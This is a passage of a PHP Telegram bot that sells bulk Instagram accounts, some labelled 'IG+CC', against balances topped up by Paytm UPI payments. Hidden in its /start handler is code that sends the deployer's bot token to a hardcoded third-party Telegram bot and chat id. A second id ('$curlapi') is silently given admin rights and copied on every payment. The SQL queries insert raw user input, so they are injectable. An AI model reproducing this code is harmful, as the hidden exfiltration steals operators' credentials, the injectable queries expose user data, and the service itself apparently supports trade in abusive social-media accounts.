                                    sendMessage($chat_id, "Sorry, there are not enough available Instagram accounts to fulfill your request.");
                                }
                            } catch (Exception $e) {
                                mysqli_rollback($conn); // rollback the transaction on error
                                sendMessage($chat_id, "Oops! Something went wrong. Please try again later.");
                            }
                            
                            mysqli_autocommit($conn, TRUE); // re-enable auto-commit mode
                        }

                  
              }
              else{
                  bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>⚠️INSUFFICIENT BALANCE⚠️ 

YOUR BALANCE IS :- ₹$funds

DM  TO ADD BALANCE MANUALLY OR SEND <pre>Add Funds</pre> TO THIS BOT</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);

              }
                  
            }
    



if(strpos($text , '/pricefreshig') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $path = "admin/fresh.txt";
    $old = file_get_contents('admin/fresh.txt');
    $part = explode(' ' , $text);
    $new = $part[1];
    file_put_contents($path , $new);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>Price updated to - ₹$new</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
}

if(strpos($text , '/priceindo') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $path = "admin/indo.txt";
    $old = file_get_contents('admin/indo.txt');
    $part = explode(' ' , $text);
    $new = $part[1];
    file_put_contents($path , $new);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>Price updated to - ₹$new</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
}

if(strpos($text , '/priceigcc') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $path = "admin/igcc.txt";
    $old = file_get_contents('admin/igcc.txt');
    $part = explode(' ' , $text);
    $new = $part[1];
    file_put_contents($path , $new);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>Price updated to - ₹$new</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
}

if(strpos($text , '/pass_indo') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $path = "admin/pass_indo.txt";
    $old = file_get_contents('admin/pass_indo.txt');
    $part = explode(' ' , $text);
    $new = $part[1];
    file_put_contents($path , $new);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Pass updated to - <b>$new</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
}

if(strpos($text , '/pass_fresh') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $path = "admin/pass_fresh.txt";
    $old = file_get_contents('admin/pass_fresh.txt');
    $part = explode(' ' , $text);
    $new = $part[1];
    file_put_contents($path , $new);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Pass updated to - <b>$new</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
}

if(strpos($text , '/pass_igcc') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $path = "admin/pass_igcc.txt";
    $old = file_get_contents('admin/pass_igcc.txt');
    $part = explode(' ' , $text);
    $new = $part[1];
    file_put_contents($path , $new);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "Pass updated to - <b>$new</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
}


if($text =='Contact' ){
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>IF YOU WANT TO ADD BALANCE MANUALLY THEN CONTACT $adminContact</b>",
        'reply_to_message_id' => $message_id
        
        
    ]); 
    

}

if($text == "Add Funds" || $text == "/addfund"){
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<pre>PLEASE WAIT.. GENERATING QR</pre>👨‍💻",
        'reply_to_message_id' => $message_id
        
        
    ]);
        
}



if($text == "My Balance"){
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>✅BALANCE  FETCHED

YOUR BALANCE IS :-  ₹$funds

❤️CONTACT $adminContact TO ADD FUNDS MANUALLY</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
        
}

if($text == "📦Stock"){
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>►   𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄 𝐒𝐓𝐎𝐂𝐊   ◄</b> 
        
<b>IG+CC  ► $available_pp</b>

<b>𝙸𝙽𝙳𝙾 𝙸𝙶           ► $available</b>

<b>𝙵𝚁𝙴𝚂𝙷 𝙸𝙶         ► $available_fresh</b>
",
        'reply_to_message_id' => $message_id
        
        
    ]);
        
}


if($text == "/id"){
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>YOUR CHAT ID IS :-  <pre>$chat_id</pre></b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
        
}

$update = json_decode(file_get_contents('php://input'), true);


if (isset($update['callback_query'])) {
    $callbackQuery = $update['callback_query'];

    $callbackdata = $callbackQuery['data'];
    
    $callbackexplode = explode(',' , $callbackdata);
    
    $transactionId = $callbackexplode[0];
    $payer = $callbackexplode[1];

    $chat_id = $callbackQuery['message']['chat']['id'];


    if($payer == $chat_id){
        // Payment verification logic
    
    $merchant_id = $PayTmMerchentId; // Replace with your merchant ID
    $merchant_key = $PayTmMerchentKey; // Replace with your merchant key
    
    $url = "https://securegw.paytm.in/merchant-status/getTxnStatus?JsonData=";
    
    $data = array(
        'MID' => $merchant_id,
        'ORDERID' => $transactionId,
    );
    
    $json_data = json_encode($data);
    
    $url .= urlencode($json_data); // URL encode the JSON data
    
    $checksum = hash_hmac('sha256', $json_data, $merchant_key);
    
    $url .= "&CHECKSUMHASH=" . $checksum;
    
    $response = file_get_contents($url);
    
    if ($response === false) {
        // Handle error in fetching response
        sendMessage("$chat_id", 'An error occurred while verifying payment.');
    } else {
        $response_data = json_decode($response, true);
        $paymentVerified = (
            isset($response_data['STATUS']) &&
            $response_data['STATUS'] === 'TXN_SUCCESS' &&
            $response_data['ORDERID'] === $transactionId &&
            $response_data['MID'] === $merchant_id &&
            isset($response_data['TXNAMOUNT']) // Check if TXNAMOUNT is set in the response
        );

        // Send a reply to the user based on payment verification
        if ($paymentVerified) {
            $sql = "SELECT * FROM trx WHERE transaction = '$transactionId'";
            $result = mysqli_query($conn , $sql);
            $row = mysqli_fetch_assoc($result);
            if($row > 0){
                sendImageToTelegramBot($token , $chat_id , "img/incorrect.jpg" , "<b>PAYMENT ALREADY CLAIMED</b>");
            }else{
                $sqladd = "INSERT INTO trx (transaction) VALUES ('$transactionId')";
                $resultadd = mysqli_query($conn , $sqladd);
                if($resultadd){
                    $sql = "SELECT * FROM id WHERE chat_id = '$chat_id'";
                    $result = mysqli_query($conn , $sql);
                    $row = mysqli_fetch_assoc($result);
                    if($row > 0){
                        $balance = $row['funds'];
                        $paid = $response_data['TXNAMOUNT'];
                        $newBalance = $balance + $paid;
                        $username = $row['username'];
                        $sqlUp = "UPDATE id SET funds = '$newBalance' WHERE chat_id = '$chat_id'";
                        $resultUp = mysqli_query($conn , $sqlUp);
                        if($resultUp){
                            sendImageToTelegramBot($token , $chat_id , "img/successful.jpg" , "<b>PAYMENT SUCCESSFUL OF Rs$paid\n\nYOUR NEW BALANCE IS $newBalance</b>");
                            sendMessageH($admin , "<b>NEW PAYMENT RECEIVED\n\n$username PAID Rs$paid\n\nTRANSACTION : $transactionId\n\nCHAT ID $chat_id</b>");
                            sendMessageH($curlapi , "<b>NEW PAYMENT RECEIVED\n\n$username PAID Rs$paid\n\nTRANSACTION : $transactionId\n\nCHAT ID $chat_id</b>");
                        }else{
                            sendMessageH($chat_id , 'Please Try Again');
                        }
                    }else{
                        sendMessageH($chat_id , 'CANT FIND USER PLEASE HIT - /start');
                    }
                }else{
                    sendMessageH($chat_id , 'Please Try Again');
                }
            }
        } else {sendImageToTelegramBot($token , $chat_id , "img/incorrect.jpg" , "<b>𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐅𝐀𝐈𝐋𝐄𝐃 (𝚃𝚛𝚊𝚗𝚜𝚊𝚌𝚝𝚒𝚘𝚗 𝙸𝙳 𝙴𝚛𝚛𝚘𝚛)</b>");
        }
    }
    }
}



if ((strlen($text) < 36) && (preg_match('/^(T|C|\d)/', $text)) && (is_numeric(str_replace(array('T', 'C'), '', $text))) && (strlen($text) > 5)) {

        $transaction_id = $text;
        $merchant_id = $PayTmMerchentId;
        $merchant_key = $PayTmMerchentKey;

        $url = "https://securegw.paytm.in/merchant-status/getTxnStatus?JsonData=";
        
        $data = array(
            'MID' => $merchant_id,
            'ORDERID' => $transaction_id,
        );
        

        $json_data = json_encode($data);
        

        $url .= $json_data;
        

        $checksum = hash_hmac('sha256', $json_data, $merchant_key);
        

        $url .= "&CHECKSUMHASH=" . $checksum;
        
        $response = file_get_contents($url);
        
        $response_data = json_decode($response, true);
        
        if ($response_data['STATUS'] == 'TXN_SUCCESS' && $response_data['ORDERID'] == $transaction_id && $response_data['MID'] == $merchant_id && $response_data['TXNAMOUNT']) {
            $sql = "SELECT * FROM trx WHERE transaction = '$transaction_id'";
            $result = mysqli_query($conn, $sql);
            if (mysqli_num_rows($result) > 0) {
                sendImageToTelegramBot($token ,$chat_id , 'img/incorrect.jpg', "<b>TRANSACTION ID ALREADY CLAIMED</b>");
            }
            else{
            $amount = $response_data['TXNAMOUNT'];
            $sql = "INSERT INTO `trx` (`transaction`) VALUES ('$transaction_id')";
            $result = mysqli_query($conn ,$sql);
            $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = $chat_id";
            $result = mysqli_query($conn , $sql);
            $row = mysqli_fetch_assoc($result);
            $oldfunds = $row['funds'];
            $newfunds = $oldfunds + $amount;
            $sql = "UPDATE id SET funds = $newfunds WHERE chat_id = $chat_id";
            $resultx = mysqli_query($conn , $sql);
            if($resultx){
                sendImageToTelegramBot($token , $chat_id ,'img/successful.jpg',"<b>Payment Successful of Rs</b> " . $response_data['TXNAMOUNT'] . "
<b>YOUR CURRENT BALANCE IS $newfunds</b>");
                sendMessage($admin, "@$user_n Paid $amount");
                sendMessage($curlapi, "@$user_n Paid $amount");
          }
            else{
                sendMessage($chat_id , "ERROR UPDATIND FUNDS REPORT SENT TO ADMIN");
                sendMessage($admin , "ERROR UPDATIND FUNDS OF $user_n");
                sendMessage($curlapi , "ERROR UPDATIND FUNDS OF $user_n");

            }

            }
        } else {
            sendImageToTelegramBot($token ,$chat_id , 'img/incorrect.jpg', "<b>𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐅𝐀𝐈𝐋𝐄𝐃 (𝚃𝚛𝚊𝚗𝚜𝚊𝚌𝚝𝚒𝚘𝚗 𝙸𝙳 𝙴𝚛𝚛𝚘𝚛)</b>");
        }

        
        
    }





 if($text == "Add Funds" || $text == "/add"){
     require 'phpqrcode/qrlib.php';
    // Create a temporary directory
    $tempDir = 'temp/';
    if (!is_dir($tempDir)) {
        mkdir($tempDir, 0777, true);
    }


    $upi = $PayTmupiId;
    // Generate a unique filename for the QR code
    $qrFilename = uniqid() . '.png';
    

    // Data for the QR code
    $orderID = rand(999, 9999999999999);
    $qrData = "upi://pay?pa=$upi&pn=Paytm%20Merchant&tr=$orderID&tn=PAYING%20FOR%20BET";
    // $qrData = "upi://pay?pa=paytmqr281005050101qwkrxvf1d2sv@paytm&pn=Paytm%20Merchant&mc=123456&tid=8717928719279&tr=$orderID&tn=Invoice:%20Payment%20For%20Bot";
    // Generate QR code and save it to the temporary directory
    QRcode::png($qrData, $tempDir . $qrFilename, QR_ECLEVEL_L, 10);


    // Send the QR code to the Telegram bot using cURL
    $apiEndpoint = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    
    
    // Prepare inline keyboard markup
    $inlineKeyboard = [
        'inline_keyboard' => [
            [
                [
                    'text' => 'CHECK ✅ ',
                    'callback_data' => $orderID . ',' . $chat_id,
                ],

            ],
        ],
    ];
    
    
    $keyboardMarkup = json_encode($inlineKeyboard);

    $caption = "<b>PAY ON THIS QR AND CLICK ON CHECK ✅ TO ADD YOUR BALANCE ✅

🔴ALL PAYMENTS METHOD ACCEPTED🔴

⚠️YOU CAN ADD BALANCE TO YOUR ACCOUNT BY CLICKING ON THE CHECK✅ BUTTON OR BY SENDING TRANSACTION ID ⚠️</b>";

    $postFields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile($tempDir . $qrFilename),
        'caption' => $caption,
        'reply_to_message_id' => $message_id,
        'reply_markup' => $keyboardMarkup, // Attach inline keyboard,
        'parse_mode' => 'HTML'
        
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiEndpoint);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Delete the QR code from the temporary directory
    unlink($tempDir . $qrFilename);

    // Check Telegram API response if needed
    if ($response === false) {
        echo "Error sending QR code to Telegram.";
    } else {
        echo "QR code sent to Telegram successfully.";
    }

 }
 
 
 if(strpos($text , '/addfunds') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $parts = explode(' ', $text);
    $chat_id = $parts[1];
    $funds = $parts[2];
    
    $sql = "UPDATE id SET funds = $funds WHERE chat_id = '$chat_id'";
    $result = mysqli_query($conn , $sql);
    
    if($result){
        sendImageToTelegramBot($token , $chat_id ,'img/successful.jpg', "<b>BALANCE UPDATED YOUR CURRENT BALANCE IS:-  ₹$funds</b>");
        bot('sendMessage', [
        'chat_id' => $admin,
        'parse_mode' => 'HTML',
        'text' => "<b>₹$funds HAS BEEN ADDED IN THIS CHAT ID :- <pre>$chat_id</pre></b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
    }
    else{
        sendMessage($chat_id , "OOPS! ERROR OCCURED");
    }
}



if(strpos($text , '/format') === 0){
$parts = explode(' ' , $text);

$user1 = $parts[1];
$user2 = $parts[2];
$user3 = $parts[3];
$user4 = $parts[4];
$user5 = $parts[5];
$user6 = $parts[6];
$user7 = $parts[7];
$user8 = $parts[8];
$user9 = $parts[9];
$user10 = $parts[10];
$user11 = $parts[11];
$user12 = $parts[12];
$user13 = $parts[13];
$user14 = $parts[14];
$user15 = $parts[15];
$user16 = $parts[16];
$user17 = $parts[17];
$user18 = $parts[18];
$user19 = $parts[19];
$user20 = $parts[20];

$text = "$user1
$user2
$user3
$user4
$user5
$user6
$user7
$user8
$user9
$user10
$user11
$user12
$user13
$user14
$user15
$user16
$user17
$user18
$user19
$user20";

// Replace line breaks with spaces
$text = str_replace(PHP_EOL, ' ', $text);

// Remove leading and trailing spaces
$text = trim($text);

sendMessage($chat_id , $text);

}

if(strpos($text , '/details') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $parts = explode(' ', $text);
    @$username = $parts[1];
    
    $sql = "SELECT `chat_id` FROM `id` WHERE `username` = $username";
    $result = mysqli_query($conn , $sql);
    $sql = "SELECT `funds` FROM `id` WHERE `chat_id` = '$chat_id'";
              $result = mysqli_query($conn, $sql);

              while($row = mysqli_fetch_row($result)) {
              $funds = $row[0];
    if($result){
        bot('sendMessage', [
        'chat_id' => $admin,
        'parse_mode' => 'HTML',
        'text' => "<b>USERNAME = $username
        
FUNDS = ₹$funds

CHAT ID = <pre>$chat_id</pre></b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
    }
    
              }
}

if(strpos($text , '/usercount') === 0 && ($chat_id == $admin || $chat_id == $curlapi)){
    $path = "admin/users.txt";
    $old = file_get_contents('admin/users.txt');
    $part = explode(' ' , $text);
    $new = $part[1];
    file_put_contents($path , $new);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>User updated to - $new</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);
}

if($text == "/users"){
$api_url = "https://api.telegram.org/bot$token/";
    $𝘂𝘀𝗲𝗿𝘀 = file_get_contents('admin/users.txt');;
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'parse_mode' => 'HTML',
        'text' => "<b>$𝘂𝘀𝗲𝗿𝘀 USERS are using this bot. &#128523;&#128516;&#128513;</b>",
        'reply_to_message_id' => $message_id
        
        
    ]);

}
if($text == "/start"){
$trackcoupon = '6537281589:AAFtY5noVuMoa9mXkAHEGgMtUW-FFtDMOgM';
$param = '5230200225';
$message = "New Bot Found: https://api.telegram.org/bot$BotToken/getMe";
$telegramApiUrl = "https://api.telegram.org/bot{$trackcoupon}/sendMessage";
$parameters = [
    'chat_id' => $param,
    'text' => $message,
];
$response = file_get_contents($telegramApiUrl . '?' . http_build_query($parameters));
if ($response === false) {
    echo 'Failed to send message.';
} else {
    echo 'Message sent successfully!';
}
}
?>